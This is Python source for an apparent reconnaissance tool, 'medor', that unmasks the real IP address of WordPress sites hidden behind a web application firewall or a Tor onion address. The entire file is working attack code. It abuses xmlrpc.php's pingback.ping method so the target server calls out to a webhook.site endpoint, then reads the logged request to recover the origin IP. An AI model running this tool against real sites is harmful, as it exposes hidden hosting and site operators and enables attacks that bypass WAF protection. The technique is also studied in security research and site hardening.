# coding: utf-8
import socket
from pathlib import Path
from urllib.parse import urlparse

import httpx
from bs4 import BeautifulSoup as bs
from colorama import Fore, Style
from validators import domain as valid_domain, ipv4, ipv6

from medor.utils import net
from medor.utils.tor import Tor
from medor.utils.util import (
    success,
    failure,
    spinner,
    found,
    not_found,
)


class Bone:
    def __init__(
        self, ptype: str, item: str, onion: bool = False, proxy: str or None = None, server: str or None = None
    ) -> None:
        self.ptype = ptype
        self.item = item
        self.onion = onion
        self.proxy = proxy
        self.server = server
        self.medor_path = Path(__file__).parent
        self.webhook_token = ""
        self.webhook_url = ""
        self.domain = ""
        self.site_url = ""
        self.post_url = ""
        self.xmlrpc_url = ""
        self.net = net.Net(onion=onion, proxy=proxy)
        self.run(ptype, item)

    def run(self, ptype: str, item: str) -> None:
        if self.onion:
            Tor().launch()
        self.net.update_ua()
        if self.proxy and not self.onion:
            self.net.check_proxy(self.proxy)

        self.domain, self.site_url, self.post_url, self.xmlrpc_url = self.parser(
            ptype, item
        )

        if not self.server:
            self.webhook_token = self.create_webhook_token()
            self.webhook_url = f"https://webhook.site/{self.webhook_token}"

        self.ping_back(
            self.xmlrpc_url,
            self.post_url,
            self.webhook_url,
        )

        self.get_ip(
            self.webhook_token,
            self.domain,
            self.site_url,
        )

    def parser(self, ptype: str, item: str) -> tuple:

        spinner.start("Parsing and creating urls")
        site_url = ""
        domain = ""
        post_url = ""
        if ptype == "domain":
            domain = item
            if valid_domain(domain):
                site_url = self.find_domain_scheme(domain)
                post_url = self.find_post(site_url)
            else:
                spinner.stop()
                exit(
                    f"{failure}{Fore.RED}The entry provided doesn't seem to be formatted as a domain.\n"
                    f"  Use a domain e.g. domain.tld."
                )
        if ptype == "site":
            site_url = item
            site_url = site_url.rstrip("/")
            self.net.valid_site_url(site_url)
            post_url = self.find_post(site_url)
            domain = ".".join(urlparse(site_url).netloc.split(".")[-2:])
        if ptype == "post":
            post_url = item
            self.test_url(post_url)
            site_url = f"{urlparse(post_url).scheme}://{urlparse(post_url).netloc}"
            domain = ".".join(urlparse(post_url).netloc.split(".")[-2:])

        xmlrpc_url = site_url + "/xmlrpc.php"
        self.test_url(xmlrpc_url)

        spinner.stop_and_persist(
            symbol=success,
            text=f"Urls parsed and created :\n"
            f"     domain : {domain}\n"
            f"     site_url : {site_url}\n"
            f"     post_url : {post_url}\n"
            f"     xmlrpc_url : {xmlrpc_url}\n",
        )

        return domain, site_url, post_url, xmlrpc_url

    def find_domain_scheme(self, domain: str) -> str:
        schemes = ["https://", "https://www.", "http://", "http://www."]
        for scheme in schemes:
            try:
                url = scheme + domain
                res = self.net.connect(url)
                if res.status_code == 200:
                    return url
            except httpx.HTTPError:
                if scheme == "http://www.":
                    spinner.stop()
                    exit(
                        f"{failure}  {Fore.RED}Domain protocol for {domain} not found.\n"
                        f"   Use site_url or post_url"
                    )
                pass

    def find_post(self, url: str) -> str:
        post = self.find_post_rest(url)
        if not post:
            post = self.find_post_feed(url)
        if post:
            return post
        spinner.stop()
        exit(
            f"{failure}  {Fore.RED}WordPress REST API is reachable but Medor can't find a blog post.\n"
            """   If you use medor find, find a post manually and use item_type=post"""
        )

    def find_post_rest(self, url: str) -> str or None:
        wp_rest = "/wp-json/wp/v2/posts"
        if self.onion:
            wp_rest = "/index.php?rest_route=/wp/v2/posts"
        try:
            res = self.net.connect(url + wp_rest)
            if res.status_code == 200:
                post = res.json()[0]["link"]
                return post
            else:
                return None
        except:
            return None

    def find_post_feed(self, url: str) -> str or None:
        try:
            res = self.net.connect(url + "/feed/")
            if res.status_code == 200:
                soup = bs(res.text, "xml")
                post = soup.find("item").find("link").text
                return post
            else:
                return None
        except:
            return None

    def test_url(self, url):
        try:
            res = self.net.connect(url, rtype="post")
            if res.status_code == 200:
                return
            else:
                spinner.stop()
                exit(
                    f"{failure}  {Fore.RED}{url} is not accessible. medor won't work."
                    f"{Fore.WHITE}{not_found()}"
                )
        except Exception as e:
            spinner.stop()
            exit(
                f"{failure}  {Fore.RED}{url} is not accessible. medor won't work.\n"
                f"{e}"
                f"{Fore.WHITE}{not_found()}"
            )

    def create_webhook_token(self) -> str:
        spinner.start(f"Creating webhook")
        content = """{"expiry": 259200}"""
        try:
            res = self.net.connect(
                "https://webhook.site/token", rtype="post", content=content
            )
            if res.status_code == 429:
                spinner.stop()
                exit(
                    f"{failure}  {Fore.RED}Your IP might have been blacklisted from webhook.site\n."
                    f"   Change your IP."
                )
            if res.status_code == 201:
                spinner.stop_and_persist(
                    symbol=success,
                    text="Webhook successfully created with webhook.site",
                )
                return res.json()["uuid"]
        except httpx.HTTPError as e:
            spinner.stop()
            exit(
                f"{failure}  {Fore.RED}Token creation failed (HTTP Error {e}).\n"
                f"   Try again later"
            )

    def ping_back(self, xmlrpc_url: str, post_url: str, webhook_url: str) -> None:
        spinner.start(f"Posting request to xmlrpc.php")
        pingback_data = f"""<?xml version="1.0" encoding="utf-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
     <param>
      <value>
       <string>{webhook_url}</string>
      </value>
     </param>
     <param>
      <value>
       <string>{post_url}</string>
      </value>
     </param>
    </params>
    </methodCall>"""

        try:
            res = self.net.connect(xmlrpc_url, rtype="post", content=pingback_data)
            if res.status_code == 200:
                spinner.stop_and_persist(
                    symbol=success, text="Xmlrpc.php successfully reached"
                )
                return
            else:
                spinner.stop()
                exit(
                    f"{failure}  {Fore.RED}{xmlrpc_url} request has not been successful.\n"
                    f"   It might be protected or offline."
                    f"{not_found()}"
                )
        except httpx.HTTPError as e:
            spinner.stop()
            exit(
                f"{failure}  {Fore.RED}{xmlrpc_url} request has not been successful : {e}.\n"
                f"   It might be protected or offline."
                f"{not_found()}"
            )

    def get_ip(self, token: str, domain, site_url) -> None:

        _headers = {"Accept": "application/json", "Content-Type": "application/json"}

        spinner.start(f"Retrieving real IP from the webhook")
        try:
            res = self.net.connect(
                f"https://webhook.site/token/{token}/request/latest",
                headers=_headers,
            )
        except httpx.HTTPError as e:
            spinner.stop()
            exit(f"{failure}  {Fore.RED}Webhook is not reachable : {e}.\n")
        try:
            if not res.json()["ip"]:
                spinner.stop()
                exit(
                    f"{failure}  {Fore.RED}No IP found for {domain}.\n"
                    f"   Xmlrpc.php might be protected."
                )
            else:
                webhook_ip = res.json()["ip"]
        except:
            spinner.stop()
            exit(
                f"{failure}  {Fore.RED}Are you sure you've provided a valid post url?\n"
                f"   It must be a WordPress post url, not a page url."
            )

        if not self.onion:
            waf_hostname = urlparse(site_url).hostname
            waf_ip = socket.gethostbyname(waf_hostname)

            if webhook_ip == waf_ip:
                spinner.stop()
                exit(
                    f"{failure}  {Fore.RED}The website IP found with xmlrpc.php is the same as {site_url}: {webhook_ip}\n"
                    f"   {site_url} is not behind WAF. No need of medor.\n"
                    f"{Fore.WHITE}{not_found()}"
                )
            else:
                spinner.stop_and_persist(
                    symbol=success,
                    text=f"{Style.BRIGHT}The website IP found with xmlrpc.php is different from {site_url} ({waf_ip}) :\n"
                    f"    The IP medor found is {Fore.GREEN}{webhook_ip}{Style.RESET_ALL}. "
                    f"Webhook url : https://webhook.site/#!/view/{token} (valid for 3 days){Fore.RESET}\n"
                    f"{found(webhook_ip)}",
                )
                exit()
        elif self.onion:
            if ipv4(webhook_ip) or ipv6(webhook_ip):
                spinner.stop_and_persist(
                    symbol=success,
                    text=f"{Style.BRIGHT}A website IP has been found with xmlrpc.php for {site_url}:\n"
                    f"    The IP is {Fore.GREEN}{webhook_ip}{Style.RESET_ALL}. "
                    f"Webhook url : https://webhook.site/#!/view/{token} (valid for 3 days){Fore.RESET}\n"
                    f"{found(webhook_ip)}",
                )
                exit()
